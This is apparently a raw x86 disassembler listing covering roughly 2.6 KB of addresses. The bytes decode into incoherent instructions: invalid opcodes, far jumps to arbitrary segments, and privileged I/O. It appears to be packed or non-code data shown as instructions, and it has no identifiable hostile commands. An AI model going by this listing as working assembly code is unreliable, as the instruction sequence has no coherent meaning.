  41be90:	and    al,0x9b
  41be92:	repnz mov al,ds:0x403b2b9a
  41be98:	add    eax,esp
  41be9a:	imul   edi,DWORD PTR [ebx],0x12474e81
  41bea0:	sbb    esi,DWORD PTR [edx-0x4a9ddcdc]
  41bea6:	jle    0x41bed1
  41bea8:	push   ds
  41bea9:	hlt    
  41beaa:	(bad)  [edi]
  41beac:	mov    DWORD PTR [ebx+0x71],ebp
  41beaf:	sub    eax,0x1a7b5eae
  41beb4:	das    
  41beb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beb6:	js     0x41be9c
  41beb8:	pop    es
  41beb9:	rcr    eax,1
  41bebb:	or     edi,DWORD PTR [edi-0x413f206b]
  41bec1:	dec    ecx
  41bec2:	and    BYTE PTR [edx],bh
  41bec4:	call   DWORD PTR [eax]
  41bec6:	inc    esp
  41bec7:	sbb    al,0x3d
  41bec9:	div    BYTE PTR [eax]
  41becb:	test   eax,0x720e6321
  41bed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bed1:	test   eax,0x2e1cdf38
  41bed6:	pusha  
  41bed7:	and    al,0x5a
  41bed9:	repz hlt 
  41bedb:	aas    
  41bedc:	adc    al,0xa9
  41bede:	jne    0x41bf0b
  41bee0:	xchg   ecx,eax
  41bee1:	in     eax,0xe0
  41bee3:	cdq    
  41bee4:	and    al,0x60
  41bee6:	int    0x15
  41bee8:	jl     0x41be98
  41beea:	sub    BYTE PTR [esi+ecx*1],dl
  41beed:	rcr    BYTE PTR [edx],0xc2
  41bef0:	pop    ebp
  41bef1:	xchg   BYTE PTR [edx-0x25],bl
  41bef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef5:	outs   dx,DWORD PTR ds:[esi]
  41bef6:	call   FWORD PTR [ebx-0x2e6f3892]
  41befc:	stos   DWORD PTR es:[edi],eax
  41befd:	xor    al,0xbc
  41beff:	outs   dx,BYTE PTR ds:[esi]
  41bf00:	test   BYTE PTR [ebx],dh
  41bf02:	lods   al,BYTE PTR ds:[esi]
  41bf03:	mov    bh,0x88
  41bf05:	enter  0x8a9e,0x45
  41bf09:	inc    ecx
  41bf0a:	inc    esi
  41bf0b:	aaa    
  41bf0c:	cmp    DWORD PTR [esi-0x12],ebx
  41bf0f:	gs push edi
  41bf11:	mov    edx,DWORD PTR [ecx+0x57]
  41bf14:	xchg   edx,eax
  41bf15:	mov    dh,0xe
  41bf17:	aad    0xa7
  41bf19:	add    al,0x83
  41bf1b:	jb     0x41bee3
  41bf1d:	mov    ebp,0xae81325
  41bf22:	mov    WORD PTR cs:[eax-0x437750b5],fs
  41bf29:	adc    al,0x5a
  41bf2b:	push   0xec3c1142
  41bf30:	cmp    al,0xae
  41bf32:	push   es
  41bf33:	retf   
  41bf34:	jmp    0x0:0x0
	...
  41bf93:	add    BYTE PTR [eax],al
  41bf95:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	sahf   
  41bfa3:	sahf   
  41bfa4:	clc    
  41bfa5:	pop    ecx
  41bfa6:	inc    edi
  41bfa7:	daa    
  41bfa8:	add    DWORD PTR [eax],eax
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    BYTE PTR [esp+esi*2],bl
  41bfb0:	jle    0x41bf4e
  41bfb2:	cwde   
  41bfb3:	ja     0x41bf86
  41bfb5:	mov    ecx,esi
  41bfb7:	sbb    BYTE PTR [ecx],dh
  41bfb9:	nop
  41bfba:	call   DWORD PTR [edi-0x58]
  41bfbd:	jge    0x41bf5d
  41bfbf:	es pushf 
  41bfc1:	xchg   BYTE PTR [ecx],bh
  41bfc3:	adc    BYTE PTR [eax+0x4a],al
  41bfc6:	pop    DWORD PTR [ebp-0x420552c0]
  41bfcc:	mov    dl,0x8a
  41bfce:	sbb    ch,BYTE PTR [ecx+0x7c]
  41bfd1:	out    0xc1,al
  41bfd3:	rcl    esp,1
  41bfd5:	push   ebx
  41bfd6:	stos   DWORD PTR es:[edi],eax
  41bfd7:	cs icebp 
  41bfd9:	mov    edx,fs
  41bfdb:	adc    edx,DWORD PTR [eax+ebp*8-0x1f]
  41bfdf:	xchg   esi,eax
  41bfe0:	mov    al,ds:0x7fb9dee
  41bfe5:	xchg   esi,eax
  41bfe6:	sbb    al,0x26
  41bfe8:	inc    ebp
  41bfe9:	nop
  41bfea:	add    edx,ebx
  41bfec:	js     0x41bf8b
  41bfee:	std    
  41bfef:	push   ds
  41bff0:	(bad)  
  41bff1:	(bad)  
  41bff2:	mov    ebx,0xfd43e3f6
  41bff7:	ficomp DWORD PTR [eax+edx*1]
  41bffa:	(bad)  
  41bffb:	jle    0x41bfc6
  41bffd:	xlat   BYTE PTR ds:[ebx]
  41bffe:	fcmovb st,st(1)
  41c000:	cmp    cl,ah
  41c002:	call   0x963c:0x94d39c7b
  41c009:	mov    ebx,0x7c264647
  41c00e:	les    esi,FWORD PTR [edi-0x53b2e78c]
  41c014:	mov    esp,0xa528ac49
  41c019:	dec    esi
  41c01a:	jge    0x41bfe5
  41c01c:	test   eax,0xe598fbe8
  41c021:	test   eax,0xf7ae9e73
  41c026:	ds ret 0xab65
  41c02a:	mov    ds:0xd54007fa,eax
  41c02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c030:	fwait
  41c031:	pop    eax
  41c032:	cmp    bh,BYTE PTR [ebp-0x59]
  41c035:	mov    al,ds:0xab11deb
  41c03a:	(bad)  
  41c03c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c03d:	shr    BYTE PTR [edx-0x1792ae22],1
  41c043:	mov    esp,0x2ed33b35
  41c048:	xchg   esp,eax
  41c049:	jg     0x41c098
  41c04b:	std    
  41c04c:	jmp    0xb518:0x1c3c53a6
  41c053:	loopne 0x41c01c
  41c055:	sbb    al,0x2d
  41c057:	outs   dx,DWORD PTR ds:[esi]
  41c058:	out    dx,al
  41c059:	dec    edi
  41c05a:	mov    ebp,0x441f1b6
  41c05f:	inc    esi
  41c060:	loop   0x41c00f
  41c062:	add    eax,eax
  41c064:	or     DWORD PTR [esi-0x7d],esp
  41c067:	or     dh,BYTE PTR [ebp+0x58]
  41c06a:	cwde   
  41c06b:	jmp    FWORD PTR [ecx-0x21]
  41c06e:	push   0xffffffd6
  41c070:	sbb    eax,0x97e63b7f
  41c075:	adc    ebx,DWORD PTR [esi-0x4e]
  41c078:	sub    dx,WORD PTR [esi+0x7]
  41c07c:	adc    ch,0x61
  41c07f:	jbe    0x41c0ac
  41c081:	test   BYTE PTR [ebp+0x25],dh
  41c084:	jmp    0x3746:0x8a0c9f92
  41c08b:	out    dx,eax
  41c08c:	or     eax,0xb02fe77e
  41c091:	jg     0x41c083
  41c093:	out    0xf6,al
  41c095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c096:	fld    TBYTE PTR [esi+0x68]
  41c099:	mov    ds:0xc0474b2b,al
  41c09e:	mov    ebp,0x4ecff24f
  41c0a3:	push   es
  41c0a4:	mov    al,ds:0xff88799
  41c0a9:	or     dh,BYTE PTR [ebx]
  41c0ab:	fld    QWORD PTR [ebp+0x6]
  41c0ae:	xor    edx,ebx
  41c0b0:	mov    ecx,0x44e3786d
	...
  41c115:	add    cl,bl
  41c117:	dec    edx
  41c118:	mov    eax,ds:0xd9fbb3f8
  41c11d:	imul   ecx,DWORD PTR [ecx-0x29],0xffffffbd
  41c121:	clc    
  41c122:	adc    ch,ch
  41c124:	test   eax,0x1284e39
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [edx+0x5ae56219],bh
  41c133:	adc    al,0x8c
  41c135:	sbb    eax,0xb9591357
  41c13a:	pop    ecx
  41c13b:	mov    bh,0x5a
  41c13d:	shl    bh,1
  41c13f:	leave  
  41c140:	sti    
  41c141:	mov    al,ds:0x7ee1a5bb
  41c146:	xor    al,0x86
  41c148:	sbb    DWORD PTR [edi+0x536ee37a],0xffffffa9
  41c14f:	fwait
  41c150:	sbb    cl,BYTE PTR [edi-0x5e]
  41c153:	lods   eax,DWORD PTR ds:[esi]
  41c154:	xchg   esp,eax
  41c155:	rcl    BYTE PTR [ebp-0x7793fe5c],0x5b
  41c15c:	jle    0x41c1dc
  41c15e:	pusha  
  41c15f:	mov    al,ds:0x14e17a06
  41c164:	fdiv   DWORD PTR [esi-0x5d621689]
  41c16a:	minps  xmm1,xmm0
  41c16d:	dec    esp
  41c16e:	sbb    ebx,eax
  41c170:	cli    
  41c171:	jne    0x41c16b
  41c173:	jae    0x41c1af
  41c175:	mov    ecx,0x841fd188
  41c17a:	rol    BYTE PTR [edx],1
  41c17c:	cmp    al,0xfc
  41c17e:	add    BYTE PTR [eax-0x52116bdc],cl
  41c184:	dec    ebp
  41c185:	fstp   QWORD PTR [ecx]
  41c187:	loope  0x41c197
  41c189:	fadd   QWORD PTR [esi+0x65846639]
  41c18f:	xchg   DWORD PTR [esp+ebp*1-0x220c38a9],edx
  41c196:	gs daa 
  41c198:	test   DWORD PTR [edi],eax
  41c19a:	rcr    BYTE PTR [edi*8+0x52cc3570],0x50
  41c1a2:	outs   dx,BYTE PTR ds:[esi]
  41c1a3:	adc    DWORD PTR [ecx+0x5f],esp
  41c1a6:	pushf  
  41c1a7:	inc    eax
  41c1a8:	jnp    0x41c1dd
  41c1aa:	lea    ecx,[edx+0x3db24cce]
  41c1b0:	sahf   
  41c1b1:	xchg   DWORD PTR [ecx+esi*4+0x8325004],esi
  41c1b8:	test   eax,0x22cac71c
  41c1bd:	je     0x41c1de
  41c1bf:	mov    al,0x17
  41c1c1:	lds    esp,FWORD PTR [ecx-0x44d34dad]
  41c1c7:	or     DWORD PTR ds:0x9df99a12,ebx
  41c1cd:	loop   0x41c24e
  41c1cf:	push   es
  41c1d0:	jb     0x41c212
  41c1d2:	fsub   DWORD PTR [ecx+0x23147be3]
  41c1d8:	add    DWORD PTR [esp+esi*1-0x6edbcbe7],ebx
  41c1df:	mov    edx,0x159d116b
  41c1e4:	xchg   ecx,eax
  41c1e5:	loop   0x41c226
  41c1e7:	sbb    eax,0x20790553
  41c1ec:	and    eax,0x8e192e22
  41c1f1:	xchg   ecx,eax
  41c1f2:	(bad)  
  41c1f3:	adc    DWORD PTR [esi+0x59],edx
  41c1f6:	xchg   edi,eax
  41c1f7:	sub    DWORD PTR [eax+0x43ff88fd],eax
  41c1fd:	mov    al,0xb
  41c1ff:	scas   al,BYTE PTR es:[edi]
  41c200:	xor    BYTE PTR [esi+0x4d],dh
  41c203:	push   0x91e74dfa
  41c208:	aad    0xed
  41c20a:	pushf  
  41c20b:	cmp    eax,0xeaaee53
  41c210:	mov    al,ds:0x94e5c96d
  41c215:	add    ebp,esi
  41c217:	shl    ah,0xfa
  41c21a:	jo     0x41c295
  41c21c:	stos   DWORD PTR es:[edi],eax
  41c21d:	jbe    0x41c221
  41c21f:	arpl   WORD PTR [eax+0x2d],cx
  41c222:	mov    BYTE PTR [ecx],dl
  41c224:	fwait
  41c225:	lock inc esi
  41c227:	mov    ecx,0xb8ba2e99
  41c22c:	mov    bl,0x9b
  41c22e:	pop    es
  41c22f:	fst    QWORD PTR [edi+0x13]
  41c232:	and    al,0xff
  41c234:	das    
	...
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	fild   WORD PTR [eax+0x25]
  41c2a5:	adc    DWORD PTR [ebp+0x29],0x1
  41c2a9:	add    BYTE PTR [edi],al
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [esi-0x1],cl
  41c2b0:	mov    bh,0xb5
  41c2b2:	mov    BYTE PTR [ecx],0x5f
  41c2b5:	fisub  DWORD PTR [ebx-0x24705c29]
  41c2bb:	push   ecx
  41c2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2bd:	ins    BYTE PTR es:[edi],dx
  41c2be:	inc    edx
  41c2bf:	loope  0x41c27e
  41c2c1:	pop    ebx
  41c2c2:	add    DWORD PTR [ebp-0x3f],ebp
  41c2c5:	enter  0x638f,0x97
  41c2c9:	pushf  
  41c2ca:	call   0x2daa:0x34b7ae40
  41c2d1:	lock lods eax,DWORD PTR ds:[esi]
  41c2d3:	pusha  
  41c2d4:	mov    ebx,DWORD PTR [edx+0x44006cf4]
  41c2da:	pop    esp
  41c2db:	dec    ecx
  41c2dc:	push   edx
  41c2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2de:	hlt    
  41c2df:	fwait
  41c2e0:	mov    eax,0x1d5412e6
  41c2e5:	fist   WORD PTR [eax+0x5a]
  41c2e8:	punpckhwd mm7,QWORD PTR [ecx+0x60]
  41c2ec:	or     edi,eax
  41c2ee:	ss inc eax
  41c2f0:	jmp    0xd962:0x82b20416
  41c2f7:	mov    ds:0x70c1d506,eax
  41c2fc:	jne    0x41c2ef
  41c2fe:	pusha  
  41c2ff:	dec    eax
  41c300:	mov    eax,ds:0x487cdaff
  41c305:	mov    eax,ds:0xb6905791
  41c30a:	sub    DWORD PTR [esi+0x326f5124],esp
  41c310:	js     0x41c344
  41c312:	dec    ebp
  41c313:	sbb    ah,BYTE PTR [eax+ebx*8-0x59]
  41c317:	xchg   esi,eax
  41c318:	out    0xe9,eax
  41c31a:	mov    esp,eax
  41c31c:	test   DWORD PTR [esi-0x2f0b3598],esi
  41c322:	int    0xa9
  41c324:	mov    ebp,0xad54a790
  41c329:	daa    
  41c32a:	out    dx,eax
  41c32b:	sub    ah,0xdb
  41c32e:	add    BYTE PTR [ebp-0x340573c6],ch
  41c334:	jmp    0x3b06:0x440deb3d
  41c33b:	pop    eax
  41c33c:	add    BYTE PTR [esi],bh
  41c33e:	lds    edx,FWORD PTR [ebx+eiz*1]
  41c341:	sub    eax,0xc29363f3
  41c346:	loopne 0x41c3b6
  41c348:	sti    
  41c349:	ss hlt 
  41c34b:	fmul   QWORD PTR [eax+0x7d]
  41c34e:	outs   dx,DWORD PTR ds:[esi]
  41c34f:	repnz mov esp,0xbe89e59a
  41c355:	inc    ebp
  41c356:	mov    ds:0x515d4b80,eax
  41c35b:	mov    bl,BYTE PTR fs:[ebp*8-0x6829e053]
  41c363:	mov    ds:0x5354f54e,al
  41c368:	sbb    eax,0x71340fa2
  41c36d:	test   al,0x2f
  41c36f:	ret    
  41c370:	sar    bh,cl
  41c372:	xor    edi,esp
  41c374:	adc    DWORD PTR [ecx+0x5970e8de],ecx
  41c37a:	push   esi
  41c37b:	leave  
  41c37c:	call   0xe298:0x9e636bdc
  41c383:	ss je  0x41c39f
  41c386:	jnp    0x41c366
  41c388:	jmp    0xcd91d1
  41c38d:	cmp    ecx,DWORD PTR [edx+edi*1-0x3c]
  41c391:	ret    
  41c392:	or     eax,0x90ed0c02
  41c397:	cmc    
  41c398:	push   esi
  41c399:	mov    ebx,0xccbbd4b7
  41c39e:	push   esp
  41c39f:	pop    edx
  41c3a0:	and    DWORD PTR [ebp+0x2],eax
  41c3a3:	sbb    ah,BYTE PTR [edi+ecx*1]
  41c3a6:	pusha  
  41c3a7:	jno    0x41c412
  41c3a9:	shl    dl,cl
  41c3ab:	retf   0xa83d
  41c3ae:	dec    esp
  41c3af:	aas    
  41c3b0:	xchg   edi,ecx
  41c3b2:	clc    
  41c3b3:	sub    DWORD PTR [ebp+0x0],esi
	...
  41c415:	add    BYTE PTR [ebx+0x20],dl
  41c418:	mov    al,ds:0x5faef3ae
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [esi+ecx*4-0x1d]
  41c424:	or     BYTE PTR [ebp+0x5c],0x2a
  41c428:	add    DWORD PTR [eax],eax
  41c42a:	pop    es
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [edx],dh
  41c42f:	enter  0xcb41,0x39
  41c433:	and    BYTE PTR [ebx+0x7d],cl
  41c436:	ins    BYTE PTR es:[edi],dx
  41c437:	jmp    0x1915:0x601d86e5
  41c43e:	fs push esi
  41c440:	rcr    DWORD PTR [edx],0x5
  41c443:	popa   
  41c444:	rcr    DWORD PTR [ecx],1
  41c446:	repnz in eax,0x63
  41c449:	bound  esi,QWORD PTR [ebp+0x7eb32b77]
  41c44f:	mov    dh,0x13
  41c451:	cs or  al,0x12
  41c454:	push   ss
  41c455:	test   BYTE PTR [ebp+edi*2-0x3f],bh
  41c459:	mov    al,ds:0xbe898db9
  41c45e:	sbb    cl,BYTE PTR [edi]
  41c460:	mov    ds:0x6dca821f,al
  41c465:	mov    cs,WORD PTR [edi+ecx*2]
  41c468:	aaa    
  41c469:	(bad)  
  41c46a:	mov    edi,0xf4a9a8e2
  41c46f:	cmp    DWORD PTR [ebx+0x2ce71d6b],eax
  41c475:	fdiv   DWORD PTR [edi+0x79]
  41c478:	pop    ebx
  41c479:	shl    DWORD PTR [edi-0x7175f369],1
  41c47f:	push   ss
  41c480:	iret   
  41c481:	stos   BYTE PTR es:[edi],al
  41c482:	pop    edx
  41c483:	add    edx,0x4c
  41c486:	pop    ds
  41c487:	sbb    BYTE PTR ds:0x3e289edf,0x6f
  41c48e:	pop    esp
  41c48f:	nop
  41c490:	les    ecx,FWORD PTR [edi]
  41c492:	and    BYTE PTR [ecx+0x6022aad0],0x91
  41c499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c49a:	mov    dl,0xec
  41c49c:	lahf   
  41c49d:	cli    
  41c49e:	or     eax,0x2ead7eb2
  41c4a3:	icebp  
  41c4a4:	add    BYTE PTR [ecx-0x740086a],ch
  41c4aa:	jne    0x41c4c6
  41c4ac:	sbb    DWORD PTR [esi-0x2f4bf96c],esi
  41c4b2:	(bad)  
  41c4b3:	js     0x41c4da
  41c4b5:	push   ebp
  41c4b6:	fdivr  QWORD PTR [eax+0x3b]
  41c4b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4ba:	xchg   esi,eax
  41c4bb:	test   BYTE PTR [ecx+esi*1],al
  41c4be:	cmp    al,0xd4
  41c4c0:	add    eax,0x91ee433e
  41c4c5:	mov    BYTE PTR [ebx-0x46],dl
  41c4c8:	mov    bl,0x8d
  41c4ca:	mov    dh,0xdb
  41c4cc:	sub    DWORD PTR [ecx+0x51],ebx
  41c4cf:	lods   al,BYTE PTR ds:[esi]
  41c4d0:	ret    0x933a
  41c4d3:	ss cwde 
  41c4d5:	mov    bh,0xc0
  41c4d7:	sbb    esi,ebx
  41c4d9:	sar    edi,1
  41c4db:	hlt    
  41c4dc:	scas   al,BYTE PTR es:[edi]
  41c4dd:	cs xor al,0x79
  41c4e0:	pushf  
  41c4e1:	(bad)  
  41c4e2:	leave  
  41c4e3:	ins    BYTE PTR es:[edi],dx
  41c4e4:	mov    ah,cl
  41c4e6:	(bad)  [eax*2+0x614f3d77]
  41c4ed:	in     al,dx
  41c4ee:	mov    esp,0x91ccd7f1
  41c4f3:	adc    al,BYTE PTR [ebp+0x75]
  41c4f6:	mov    dl,0x65
  41c4f8:	mov    eax,ds:0x392e668e
  41c4fd:	dec    ebp
  41c4fe:	imul   esp,DWORD PTR [edx],0x59814477
  41c504:	ror    DWORD PTR [esp+ecx*1],0xc5
  41c508:	rcr    ebp,cl
  41c50a:	sub    eax,0xeb5cda0b
  41c50f:	sar    DWORD PTR [ecx+0x62],0xef
  41c513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c514:	call   0xbb8f:0xcae2ec94
  41c51b:	mov    cl,0xec
  41c51d:	test   BYTE PTR [ebp-0x7674a3e0],0xeb
  41c524:	and    dh,al
  41c526:	or     eax,0x82c3af78
  41c52b:	xor    BYTE PTR ds:0x35482bc8,bh
  41c531:	test   cl,dl
  41c533:	xchg   ebx,eax
  41c534:	fiadd  WORD PTR [eax]
	...
  41c596:	lds    esp,FWORD PTR [ebx]
  41c598:	xchg   ecx,eax
  41c599:	and    eax,0xe3f5b7f7
  41c59e:	sbb    ch,BYTE PTR [edx+0x10]
  41c5a1:	stc    
  41c5a2:	imul   edi,DWORD PTR [ebx+0x2b636510],0x1070001
  41c5ac:	add    BYTE PTR [eax],al
  41c5ae:	dec    ebp
  41c5af:	nop
  41c5b0:	ins    BYTE PTR es:[edi],dx
  41c5b1:	fnsave [ecx]
  41c5b3:	rol    BYTE PTR [ecx],1
  41c5b5:	and    al,0x5a
  41c5b7:	test   DWORD PTR [ebp-0x63],esi
  41c5ba:	adc    DWORD PTR [edi+eiz*1],eax
  41c5bd:	call   0x1222:0x46ab29aa
  41c5c4:	inc    ebx
  41c5c5:	sar    BYTE PTR [edx],1
  41c5c7:	mov    eax,cr1
  41c5ca:	sub    BYTE PTR [edx-0x1f],cl
  41c5cd:	inc    ebx
  41c5ce:	jmp    0x41c607
  41c5d0:	sbb    bh,cl
  41c5d2:	shl    DWORD PTR [esp+esi*4],1
  41c5d5:	or     edx,DWORD PTR [ebp-0xf]
  41c5d8:	bound  esi,QWORD PTR [esi]
  41c5da:	push   es
  41c5db:	adc    ah,ch
  41c5dd:	dec    ecx
  41c5de:	mov    ebx,0x42524bb6
  41c5e3:	or     DWORD PTR [ebp+0x5a],eax
  41c5e6:	xchg   esi,eax
  41c5e7:	loopne 0x41c627
  41c5e9:	popa   
  41c5ea:	ret    0x62d4
  41c5ed:	call   0xb9e40b1f
  41c5f2:	cmp    al,0x55
  41c5f4:	or     eax,0xad31c07e
  41c5f9:	(bad)  
  41c5fa:	mov    bl,0x40
  41c5fc:	call   0x5299287f
  41c601:	xor    eax,0x92d2c795
  41c606:	loope  0x41c600
  41c608:	mov    cl,0xc3
  41c60a:	sbb    ah,BYTE PTR [esp+ecx*8-0x1fb3ee61]
  41c611:	lods   eax,DWORD PTR ds:[esi]
  41c612:	daa    
  41c613:	pop    esp
  41c614:	je     0x41c687
  41c616:	fcomp  DWORD PTR [ebx+0x31788225]
  41c61c:	adc    BYTE PTR [edi+0x3583d310],0x1c
  41c623:	jl     0x41c69c
  41c625:	jne    0x41c64b
  41c627:	enter  0x5d11,0x28
  41c62b:	int    0xff
  41c62d:	jno    0x41c68e
  41c62f:	xor    edx,DWORD PTR fs:[ebx-0x3c]
  41c633:	fsub   DWORD PTR [ebx+ecx*8-0x60]
  41c637:	sbb    BYTE PTR [edi+0x3548d62a],dh
  41c63d:	lock sub DWORD PTR [esi+0x2980a676],edi
  41c644:	jns    0x41c5e7
  41c646:	push   edx
  41c647:	ja     0x41c635
  41c649:	int3   
  41c64a:	fistp  WORD PTR [ebp+0x435340a6]
  41c650:	out    dx,al
  41c651:	push   cs
  41c652:	xor    eax,DWORD PTR gs:[ebx+ebx*4]
  41c656:	pop    edx
  41c657:	les    ecx,FWORD PTR [ebx]
  41c659:	rep stos BYTE PTR es:[edi],al
  41c65b:	jmp    0x603d3b51
  41c660:	push   cs
  41c661:	call   0x3ea2:0xd1e360f4
  41c668:	cmp    cl,dh
  41c66a:	jp     0x41c62f
  41c66c:	xor    BYTE PTR [ebx+0xdf00728],0x51
  41c673:	push   ecx
  41c674:	dec    edi
  41c675:	retf   
  41c676:	jno    0x41c6f6
  41c678:	adc    eax,0x2185ec7c
  41c67d:	int    0x59
  41c67f:	ss dec ebx
  41c681:	cmp    eax,0x9047b766
  41c686:	loope  0x41c63d
  41c688:	dec    esp
  41c689:	iret   
  41c68a:	adc    eax,0xe3c3c52
  41c68f:	or     DWORD PTR [edx],0x801184fb
  41c695:	fld    TBYTE PTR [edx]
  41c697:	pop    ds
  41c698:	adc    ah,BYTE PTR ds:0x148b9bec
  41c69e:	lock or BYTE PTR [edx+0x58],cl
  41c6a2:	or     ch,BYTE PTR [ecx-0x43]
  41c6a5:	cdq    
  41c6a6:	lahf   
  41c6a7:	xchg   ecx,eax
  41c6a8:	in     eax,0xba
  41c6aa:	mov    al,0x4c
  41c6ac:	pusha  
  41c6ad:	jecxz  0x41c6d3
  41c6af:	push   edi
  41c6b0:	mov    dh,0xf8
  41c6b2:	fimul  DWORD PTR [esi+0x75]
	...
  41c715:	add    dl,bl
  41c717:	add    edx,eax
  41c719:	xchg   bl,bl
  41c71b:	(bad)  
  41c71c:	ficomp WORD PTR [ebp+0x7e]
  41c71f:	cmp    BYTE PTR [ecx+0x13],dh
  41c722:	mov    ebp,ss
  41c724:	cdq    
  41c725:	push   edi
  41c726:	push   0x2c
  41c728:	add    DWORD PTR [eax],eax
  41c72a:	pop    es
  41c72b:	add    DWORD PTR [eax],eax
  41c72d:	add    BYTE PTR [ecx],cl
  41c72f:	xor    BYTE PTR [ebp-0x32],dl
  41c732:	aaa    
  41c733:	pop    ebp
  41c734:	(bad)  
  41c735:	scas   eax,DWORD PTR es:[edi]
  41c736:	mov    ah,0x32
  41c738:	call   0x3479:0x4931b2e7
  41c73f:	sub    al,0x32
  41c741:	inc    esp
  41c742:	ds jg  0x41c70e
  41c745:	or     eax,0xc25a61ec
  41c74a:	int3   
  41c74b:	pop    esp
  41c74c:	xchg   BYTE PTR [eax+0x6f],ch
  41c74f:	push   ebp
  41c750:	fnstsw WORD PTR [ecx]
  41c752:	aaa    
  41c753:	test   eax,0xc210ad90
  41c758:	sbb    ecx,edi
  41c75a:	sbb    DWORD PTR [ecx],edx
  41c75c:	mov    ds:0x55e7d1b7,al
  41c761:	xor    ebx,esp
  41c763:	stos   DWORD PTR es:[edi],eax
  41c764:	mov    eax,ds:0xd8f44931
  41c769:	ror    DWORD PTR ds:0xef0e0e00,1
  41c76f:	sbb    eax,0x1506633b
  41c774:	mov    fs,WORD PTR [esi+0x53]
  41c777:	mov    ecx,0x4dc89328
  41c77c:	and    al,0x58
  41c77e:	mov    al,0x75
  41c780:	mov    esi,DWORD PTR [ecx-0x4f8e3a32]
  41c786:	in     al,dx
  41c787:	(bad)  
  41c788:	jmp    0xfbbb:0x6ef90851
  41c78f:	mov    WORD PTR ds:0x506f1e47,ds
  41c795:	pop    eax
  41c796:	jo     0x41c806
  41c798:	pushf  
  41c799:	cmp    al,0xae
  41c79b:	adc    eax,0xf4e636aa
  41c7a0:	in     al,dx
  41c7a1:	js     0x41c75c
  41c7a3:	mov    bh,al
  41c7a5:	frstor [eax]
  41c7a7:	js     0x41c734
  41c7a9:	sub    esp,0x13
  41c7ac:	push   0xeeb5524c
  41c7b1:	lds    ecx,FWORD PTR [eax]
  41c7b3:	jnp    0x41c833
  41c7b5:	mov    ah,0x1b
  41c7b7:	xor    eax,0xa50a1e2b
  41c7bc:	into   
  41c7bd:	ins    BYTE PTR es:[edi],dx
  41c7be:	cld    
  41c7bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7c0:	jbe    0x41c811
  41c7c2:	push   ebx
  41c7c3:	xchg   DWORD PTR [edx+0x2d2d9ab8],ebx
  41c7c9:	mov    dh,0x1c
  41c7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7cc:	sar    BYTE PTR [ecx+0x32],cl
  41c7cf:	xchg   ebx,eax
  41c7d0:	add    ch,BYTE PTR [ecx]
  41c7d2:	mov    dl,0xf8
  41c7d4:	hlt    
  41c7d5:	or     BYTE PTR [eax+edx*1-0x1f],cl
  41c7d9:	rcl    esi,cl
  41c7db:	mov    eax,ds:0xd9906322
  41c7e0:	add    cl,BYTE PTR [edx+0x373624c4]
  41c7e6:	outs   dx,DWORD PTR ds:[esi]
  41c7e7:	push   0x112d0167
  41c7ec:	jb     0x41c7d5
  41c7ee:	sbb    BYTE PTR [eax+eax*2-0x62269041],0x4f
  41c7f6:	push   cs
  41c7f7:	out    0x67,al
  41c7f9:	pop    ss
  41c7fa:	dec    ebx
  41c7fb:	test   BYTE PTR [ebp-0x15],bl
  41c7fe:	js     0x41c864
  41c800:	bnd jmp 0x41c789
  41c803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c804:	sbb    eax,0x7b3a8be2
  41c809:	imul   esi,edi,0xfffffffe
  41c80c:	shl    DWORD PTR [edx-0x21519ab5],0x4b
  41c813:	pusha  
  41c814:	push   cs
  41c815:	retf   0x66d8
  41c818:	mov    bh,0x2b
  41c81a:	sbb    esi,DWORD PTR [edi]
  41c81c:	out    dx,eax
  41c81d:	xor    ebx,edx
  41c81f:	shl    BYTE PTR [ebx],cl
  41c821:	(bad)  
  41c822:	fnstcw WORD PTR [ebx-0x43]
  41c825:	push   ebx
  41c826:	xor    DWORD PTR [ebx-0x460cf946],ecx
  41c82c:	push   esi
  41c82d:	sbb    ecx,DWORD PTR [edx-0xb993eae]
  41c833:	imul   esp,DWORD PTR [ebx],0x0
	...
  41c896:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c89d:	ja     0x41c8c2
  41c89f:	cs js  0x41c910
  41c8a2:	rol    DWORD PTR [edi],0x8b
  41c8a5:	cmp    dh,BYTE PTR [ecx+0x2d]
  41c8a8:	add    DWORD PTR [eax],eax
  41c8aa:	pop    es
  41c8ab:	add    DWORD PTR [eax],eax
  41c8ad:	add    BYTE PTR [ecx-0x8],ah
  41c8b0:	jns    0x41c8c3
  41c8b2:	aas    
  41c8b3:	jmp    0x41c8c9
  41c8b5:	ret    
  41c8b6:	test   BYTE PTR [eax-0x2e05228e],bl
  41c8bc:	xchg   esi,eax
  41c8bd:	jmp    0xe31e:0x96c0c64
  41c8c4:	gs popf 
  41c8c6:	arpl   si,dx
  41c8c8:	mov    ebx,0x44b32f3e
